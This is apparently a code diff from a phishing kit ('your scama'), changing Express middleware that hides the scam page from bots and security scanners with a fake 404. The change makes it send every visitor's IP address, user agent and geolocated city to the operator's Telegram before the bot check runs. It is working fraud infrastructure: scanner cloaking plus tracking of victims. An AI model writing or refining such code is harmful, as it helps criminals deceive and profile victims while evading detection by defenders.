@@ -251,32 +251,28 @@ async function antiBotMiddleware(req, res, next) {
     const clientIP = getClientIp(req);
     const clientRef = req.headers.referer || req.headers.origin;
     let messageSent = false;
+
+    let message = "";
+    const sendAPIRequest = async (ipAddress) => {
+        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
+        console.log(apiResponse.data);
+        return apiResponse.data;
+    };
+
+    const userAgent = req.headers["user-agent"];
+    const systemLang = req.headers["accept-language"];
+
+    const ipAddress = getClientIp(req);
+    const ipAddressInformation = await sendAPIRequest(ipAddress);
+    message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
+    sendTelegramMessage(message);
     if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
         return res.status(404).send('Not Found');
     } else {
-        let message = "";
-        const sendAPIRequest = async (ipAddress) => {
-            const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
-            console.log(apiResponse.data);
-            return apiResponse.data;
-        };
-    
-        const userAgent = req.headers["user-agent"];
-        const systemLang = req.headers["accept-language"];
-    
-        const ipAddress = getClientIp(req);
-        const ipAddressInformation = await sendAPIRequest(ipAddress);
-    
+       
         try {
     
-            message += ` ✈️ ${ipAddress} visited your scama on ${currentDate}\n 🌐 ${userAgent}\n 📍 From ${ipAddressInformation.country.name} |  ${ipAddressInformation.location.city} | ${ipAddressInformation.location.principalSubdivision}`;
-                
-            if (!messageSent) {
-                // Only send the message if it hasn't been sent yet for this request
-                sendTelegramMessage(message);
-                messageSent = true;  // Update the flag
-            }
-                        console.log(messageSent);
+      console.log(messageSent);
             // Send the HTML content as a response
             res.send(htmlContent);
         } catch (error) {
